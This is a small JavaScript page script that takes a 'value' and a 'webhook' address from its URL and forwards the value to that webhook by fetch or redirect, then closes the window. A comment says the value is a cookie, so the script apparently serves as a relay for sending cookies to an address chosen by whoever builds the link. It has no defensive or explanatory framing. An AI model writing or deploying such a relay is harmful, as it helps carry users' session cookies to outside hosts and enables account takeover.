// Parse URL parameters
const urlParams = new URLSearchParams(window.location.search);
const myValue = urlParams.get('value');
const webhookUrl = urlParams.get('webhook');

const loading = document.getElementById('loading');
const success = document.getElementById('success');
const error = document.getElementById('error');
const errorMsg = document.getElementById('error-msg');

// Validate request
if (!myValue) {
    loading.style.display = 'none';
    error.style.display = 'block';
    errorMsg.textContent = 'Missing value parameter';
} else if (!webhookUrl) {
    loading.style.display = 'none';
    error.style.display = 'block';
    errorMsg.textContent = 'Missing webhook URL';
} else {
    forwardValue(myValue, webhookUrl);
}

async function forwardValue(value, webhook) {
    try {
        // Decode webhook URL (it comes URL-encoded)
        const decodedWebhook = decodeURIComponent(webhook);
        
        // Build verification URL - just pass the cookie
        const verifyUrl = `${decodedWebhook}?value=${encodeURIComponent(value)}`;
        
        // Try to send via fetch
        try {
            const response = await fetch(verifyUrl, {
                method: 'GET',
                mode: 'no-cors'
            });
            
            loading.style.display = 'none';
            success.style.display = 'block';
            
            setTimeout(() => {
                window.close();
            }, 2000);
            
        } catch (fetchError) {
            // Fallback: redirect to webhook
            window.location.href = verifyUrl;
        }
        
    } catch (err) {
        loading.style.display = 'none';
        error.style.display = 'block';
        errorMsg.textContent = 'Failed to forward value';
    }
}
